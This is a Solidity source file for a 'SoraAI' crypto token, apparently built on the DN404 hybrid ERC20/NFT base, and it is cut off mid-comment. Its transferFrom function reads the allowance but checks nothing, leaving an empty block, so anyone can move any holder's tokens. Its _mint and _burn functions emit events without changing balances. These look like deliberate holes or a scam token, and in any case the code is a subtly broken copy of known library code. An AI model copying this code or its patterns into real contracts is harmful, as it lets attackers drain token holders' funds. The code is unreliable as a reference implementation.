{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/**\r\n\r\nhttps://sora-ai.vip/\r\nhttps://twitter.com/SoraAIToken\r\nhttps://t.me/SoraAIToken\r\n\r\n*/\r\n\r\n\r\npragma solidity ^0.7.6;\r\n\r\n\r\n\r\n/**\r\n * @dev Standard math utilities missing in the Solidity language.\r\n */\r\nlibrary Math {\r\n\r\n\r\n    enum Rounding {\r\n        Floor, // Toward negative infinity\r\n        Ceil, // Toward positive infinity\r\n        Trunc, // Toward zero\r\n        Expand // Away from zero\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n      \r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        \r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        \r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n      \r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the largest of two numbers.\r\n     */\r\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a > b ? a : b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the smallest of two numbers.\r\n     */\r\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the average of two numbers. The result is rounded towards\r\n     * zero.\r\n     */\r\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // (a + b) / 2 can overflow.\r\n        return (a & b) + (a ^ b) / 2;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the ceiling of the division of two numbers.\r\n     *\r\n     * This differs from standard division with `/` in that it rounds towards infinity instead\r\n     * of rounding towards zero.\r\n     */\r\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (b == 0) {\r\n            // Guarantee the same behavior as in a regular Solidity division.\r\n            return a / b;\r\n        }\r\n\r\n        // (a + b - 1) / b can overflow on addition, so we distribute.\r\n        return a == 0 ? 0 : (a - 1) / b + 1;\r\n    }\r\n\r\n    /**\r\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\r\n     * denominator == 0.\r\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\r\n     * Uniswap Labs also under MIT license.\r\n     */\r\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\r\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\r\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\r\n            // variables such that product = prod1 * 2^256 + prod0.\r\n            uint256 prod0 = x * y; // Least significant 256 bits of the product\r\n            uint256 prod1; // Most significant 256 bits of the product\r\n            assembly {\r\n                let mm := mulmod(x, y, not(0))\r\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\r\n            }\r\n\r\n            // Handle non-overflow cases, 256 by 256 division.\r\n            if (prod1 == 0) {\r\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\r\n                // The surrounding unchecked block does not change this fact.\r\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\r\n                return prod0 / denominator;\r\n            }\r\n\r\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\r\n            if (denominator <= prod1) {\r\n                revert();\r\n            }\r\n\r\n            ///////////////////////////////////////////////\r\n            // 512 by 256 division.\r\n            ///////////////////////////////////////////////\r\n\r\n            // Make division exact by subtracting the remainder from [prod1 prod0].\r\n            uint256 remainder;\r\n            assembly {\r\n                // Compute remainder using mulmod.\r\n                remainder := mulmod(x, y, denominator)\r\n\r\n                // Subtract 256 bit number from 512 bit number.\r\n                prod1 := sub(prod1, gt(remainder, prod0))\r\n                prod0 := sub(prod0, remainder)\r\n            }\r\n\r\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\r\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\r\n\r\n            uint256 twos = denominator & (0 - denominator);\r\n            assembly {\r\n                // Divide denominator by twos.\r\n                denominator := div(denominator, twos)\r\n\r\n                // Divide [prod1 prod0] by twos.\r\n                prod0 := div(prod0, twos)\r\n\r\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\r\n                twos := add(div(sub(0, twos), twos), 1)\r\n            }\r\n\r\n            // Shift in bits from prod1 into prod0.\r\n            prod0 |= prod1 * twos;\r\n\r\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\r\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\r\n            // four bits. That is, denominator * inv = 1 mod 2^4.\r\n            uint256 inverse = (3 * denominator) ^ 2;\r\n\r\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\r\n            // works in modular arithmetic, doubling the correct bits in each step.\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\r\n\r\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\r\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\r\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\r\n            // is no longer required.\r\n            result = prod0 * inverse;\r\n            return result;\r\n    }\r\n\r\n    /**\r\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\r\n     */\r\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\r\n        uint256 result = mulDiv(x, y, denominator);\r\n        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {\r\n            result += 1;\r\n        }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\r\n     * towards zero.\r\n     *\r\n     * Inspired by Henry S. Warren, Jr.'s \"Hacker's Delight\" (Chapter 11).\r\n     */\r\n    function sqrt(uint256 a) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\r\n        //\r\n        // We know that the \"msb\" (most significant bit) of our target number `a` is a power of 2 such that we have\r\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\r\n        //\r\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\r\n        // \u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\r\n        // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\r\n        //\r\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\r\n        uint256 result = 1 << (log2(a) >> 1);\r\n\r\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\r\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\r\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\r\n        // into the expected uint128 result.\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            return min(result, a / result);\r\n    }\r\n\r\n    /**\r\n     * @notice Calculates sqrt(a), following the selected rounding direction.\r\n     */\r\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\r\n            uint256 result = sqrt(a);\r\n            return result + (unsignedRoundsUp(rounding) && result * result < a ? 1 : 0);\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log2(uint256 value) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n            if (value >> 128 > 0) {\r\n                value >>= 128;\r\n                result += 128;\r\n            }\r\n            if (value >> 64 > 0) {\r\n                value >>= 64;\r\n                result += 64;\r\n            }\r\n            if (value >> 32 > 0) {\r\n                value >>= 32;\r\n                result += 32;\r\n            }\r\n            if (value >> 16 > 0) {\r\n                value >>= 16;\r\n                result += 16;\r\n            }\r\n            if (value >> 8 > 0) {\r\n                value >>= 8;\r\n                result += 8;\r\n            }\r\n            if (value >> 4 > 0) {\r\n                value >>= 4;\r\n                result += 4;\r\n            }\r\n            if (value >> 2 > 0) {\r\n                value >>= 2;\r\n                result += 2;\r\n            }\r\n            if (value >> 1 > 0) {\r\n                result += 1;\r\n            }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\r\n            uint256 result = log2(value);\r\n            return result + (unsignedRoundsUp(rounding) && 1 << result < value ? 1 : 0);\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log10(uint256 value) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n            if (value >= 10 ** 64) {\r\n                value /= 10 ** 64;\r\n                result += 64;\r\n            }\r\n            if (value >= 10 ** 32) {\r\n                value /= 10 ** 32;\r\n                result += 32;\r\n            }\r\n            if (value >= 10 ** 16) {\r\n                value /= 10 ** 16;\r\n                result += 16;\r\n            }\r\n            if (value >= 10 ** 8) {\r\n                value /= 10 ** 8;\r\n                result += 8;\r\n            }\r\n            if (value >= 10 ** 4) {\r\n                value /= 10 ** 4;\r\n                result += 4;\r\n            }\r\n            if (value >= 10 ** 2) {\r\n                value /= 10 ** 2;\r\n                result += 2;\r\n            }\r\n            if (value >= 10 ** 1) {\r\n                result += 1;\r\n            }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\r\n            uint256 result = log10(value);\r\n            return result + (unsignedRoundsUp(rounding) && 10 ** result < value ? 1 : 0);\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\r\n     * Returns 0 if given 0.\r\n     *\r\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\r\n     */\r\n    function log256(uint256 value) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n            if (value >> 128 > 0) {\r\n                value >>= 128;\r\n                result += 16;\r\n            }\r\n            if (value >> 64 > 0) {\r\n                value >>= 64;\r\n                result += 8;\r\n            }\r\n            if (value >> 32 > 0) {\r\n                value >>= 32;\r\n                result += 4;\r\n            }\r\n            if (value >> 16 > 0) {\r\n                value >>= 16;\r\n                result += 2;\r\n            }\r\n            if (value >> 8 > 0) {\r\n                result += 1;\r\n            }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\r\n            uint256 result = log256(value);\r\n            return result + (unsignedRoundsUp(rounding) && 1 << (result << 3) < value ? 1 : 0);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\r\n     */\r\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\r\n        return uint8(rounding) % 2 == 1;\r\n    }\r\n}\r\n\r\n/// @title DN404\r\n/// @notice DN404 is a hybrid ERC20 and ERC721 implementation that mints\r\n/// and burns NFTs based on an account's ERC20 token balance.\r\n///\r\n/// @author vectorized.eth (@optimizoor)\r\n/// @author Quit (@0xQuit)\r\n/// @author Michael Amadi (@AmadiMichaels)\r\n/// @author cygaar (@0xCygaar)\r\n/// @author Thomas (@0xjustadev)\r\n/// @author Harrison (@PopPunkOnChain)\r\n///\r\n/// @dev Note:\r\n/// - The ERC721 data is stored in this base DN404 contract, however a\r\n///   DN404Mirror contract ***MUST*** be deployed and linked during\r\n///   initialization.\r\nabstract contract DN404 {\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                           EVENTS                           */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Emitted when `amount` tokens is transferred from `from` to `to`.\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n\r\n    /// @dev Emitted when `amount` tokens is approved by `owner` to be used by `spender`.\r\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\r\n\r\n    /// @dev Emitted when `target` sets their skipNFT flag to `status`.\r\n    event SkipNFTSet(address indexed target, bool status);\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                        CUSTOM ERRORS                       */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                         CONSTANTS                          */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Amount of token balance that is equal to one NFT.\r\n    uint256 internal constant _WAD = 10 ** 18;\r\n\r\n    /// @dev The maximum token ID allowed for an NFT.\r\n    uint256 internal constant _MAX_TOKEN_ID = 0xffffffff;\r\n\r\n    /// @dev The maximum possible token supply.\r\n    uint256 internal constant _MAX_SUPPLY = 10 ** 18 * 0xffffffff - 1;\r\n\r\n    /// @dev The flag to denote that the address data is initialized.\r\n    uint8 internal constant _ADDRESS_DATA_INITIALIZED_FLAG = 1 << 0;\r\n\r\n    /// @dev The flag to denote that the address should skip NFTs.\r\n    uint8 internal constant _ADDRESS_DATA_SKIP_NFT_FLAG = 1 << 1;\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                          STORAGE                           */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Struct containing an address's token data and settings.\r\n    struct AddressData {\r\n        // Auxiliary data.\r\n        uint88 aux;\r\n        // Flags for `initialized` and `skipNFT`.\r\n        uint8 flags;\r\n        // The alias for the address. Zero means absence of an alias.\r\n        uint32 addressAlias;\r\n        // The number of NFT tokens.\r\n        uint32 ownedLength;\r\n        // The token balance in wei.\r\n        uint96 balance;\r\n    }\r\n\r\n    /// @dev A uint32 map in storage.\r\n    struct Uint32Map {\r\n        mapping(uint256 => uint256) map;\r\n    }\r\n\r\n    /// @dev Struct containing the base token contract storage.\r\n    struct DN404Storage {\r\n        // Current number of address aliases assigned.\r\n        uint32 numAliases;\r\n        // Next token ID to assign for an NFT mint.\r\n        uint32 nextTokenId;\r\n        // Total supply of minted NFTs.\r\n        uint32 totalNFTSupply;\r\n        // Total supply of tokens.\r\n        uint96 totalSupply;\r\n        // Address of the NFT mirror contract.\r\n        address mirrorERC721;\r\n        // Mapping of a user alias number to their address.\r\n        mapping(uint32 => address) aliasToAddress;\r\n        // Mapping of user operator approvals for NFTs.\r\n        mapping(address => mapping(address => bool)) operatorApprovals;\r\n        // Mapping of NFT token approvals to approved operators.\r\n        mapping(uint256 => address) tokenApprovals;\r\n        // Mapping of user allowances for token spenders.\r\n        mapping(address => mapping(address => uint256)) allowance;\r\n        // Mapping of NFT token IDs owned by an address.\r\n        mapping(address => Uint32Map) owned;\r\n        // Even indices: owner aliases. Odd indices: owned indices.\r\n        Uint32Map oo;\r\n        // Mapping of user account AddressData\r\n        mapping(address => AddressData) addressData;\r\n    }\r\n\r\n    /// @dev Returns a storage pointer for DN404Storage.\r\n    function _getDN404Storage() internal pure virtual returns (DN404Storage storage $) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // `uint72(bytes9(keccak256(\"DN404_STORAGE\")))`.\r\n            $.slot := 0xa20d6e21d0e5255308 // Truncate to 9 bytes to reduce bytecode size.\r\n        }\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                         INITIALIZER                        */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Initializes the DN404 contract with an\r\n    /// `initialTokenSupply`, `initialTokenOwner` and `mirror` NFT contract address.\r\n    function _initializeDN404(\r\n        uint256 initialTokenSupply,\r\n        address initialSupplyOwner,\r\n        address mirror\r\n    ) internal virtual {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n\r\n        _linkMirrorContract(mirror);\r\n\r\n        $.nextTokenId = 1;\r\n        $.mirrorERC721 = mirror;\r\n\r\n        if (initialTokenSupply > 0) {\r\n\r\n            $.totalSupply = uint96(initialTokenSupply);\r\n            AddressData storage initialOwnerAddressData = _addressData(initialSupplyOwner);\r\n            initialOwnerAddressData.balance = uint96(initialTokenSupply);\r\n\r\n            emit Transfer(address(0), initialSupplyOwner, initialTokenSupply);\r\n\r\n            _setSkipNFT(initialSupplyOwner, true);\r\n        }\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*               METADATA FUNCTIONS TO OVERRIDE               */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Returns the name of the token.\r\n    function name() public view virtual returns (string memory);\r\n\r\n    /// @dev Returns the symbol of the token.\r\n    function symbol() public view virtual returns (string memory);\r\n\r\n    /// @dev Returns the Uniform Resource Identifier (URI) for token `id`.\r\n    function tokenURI(uint256 id) public view virtual returns (string memory);\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                      ERC20 OPERATIONS                      */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Returns the decimals places of the token. Always 18.\r\n    function decimals() public pure returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    /// @dev Returns the amount of tokens in existence.\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return uint256(_getDN404Storage().totalSupply);\r\n    }\r\n\r\n    /// @dev Returns the amount of tokens owned by `owner`.\r\n    function balanceOf(address owner) public view virtual returns (uint256) {\r\n        return _getDN404Storage().addressData[owner].balance;\r\n    }\r\n\r\n    /// @dev Returns the amount of tokens that `spender` can spend on behalf of `owner`.\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _getDN404Storage().allowance[owner][spender];\r\n    }\r\n\r\n    /// @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n    ///\r\n    /// Emits a {Approval} event.\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        $.allowance[msg.sender][spender] = amount;\r\n\r\n        emit Approval(msg.sender, spender, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    /// @dev Transfer `amount` tokens from the caller to `to`.\r\n    ///\r\n    /// Will burn sender NFTs if balance after transfer is less than\r\n    /// the amount required to support the current NFT balance.\r\n    ///\r\n    /// Will mint NFTs to `to` if the recipient's new balance supports\r\n    /// additional NFTs ***AND*** the `to` address's skipNFT flag is\r\n    /// set to false.\r\n    ///\r\n    /// Requirements:\r\n    /// - `from` must at least have `amount`.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /// @dev Transfers `amount` tokens from `from` to `to`.\r\n    ///\r\n    /// Note: Does not update the allowance if it is the maximum uint256 value.\r\n    ///\r\n    /// Will burn sender NFTs if balance after transfer is less than\r\n    /// the amount required to support the current NFT balance.\r\n    ///\r\n    /// Will mint NFTs to `to` if the recipient's new balance supports\r\n    /// additional NFTs ***AND*** the `to` address's skipNFT flag is\r\n    /// set to false.\r\n    ///\r\n    /// Requirements:\r\n    /// - `from` must at least have `amount`.\r\n    /// - The caller must have at least `amount` of allowance to transfer the tokens of `from`.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        uint256 allowed = $.allowance[from][msg.sender];\r\n\r\n        if (allowed != type(uint256).max) {\r\n            \r\n        }\r\n\r\n        _transfer(from, to, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                  INTERNAL MINT FUNCTIONS                   */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Mints `amount` tokens to `to`, increasing the total supply.\r\n    ///\r\n    /// Will mint NFTs to `to` if the recipient's new balance supports\r\n    /// additional NFTs ***AND*** the `to` address's skipNFT flag is\r\n    /// set to false.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function _mint(address to, uint256 amount) internal virtual {\r\n\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        AddressData storage toAddressData = _addressData(to);\r\n\r\n        \r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                  INTERNAL BURN FUNCTIONS                   */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Burns `amount` tokens from `from`, reducing the total supply.\r\n    ///\r\n    /// Will burn sender NFTs if balance after transfer is less than\r\n    /// the amount required to support the current NFT balance.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function _burn(address from, uint256 amount) internal virtual {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        AddressData storage fromAddressData = _addressData(from);\r\n\r\n        uint256 fromBalance = fromAddressData.balance;\r\n\r\n        uint256 currentTokenSupply = $.totalSupply;\r\n\r\n        \r\n        emit Transfer(from, address(0), amount);\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                INTERNAL TRANSFER FUNCTIONS                 */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Moves `amount` of tokens from `from` to `to`.\r\n    ///\r\n    /// Will burn sender 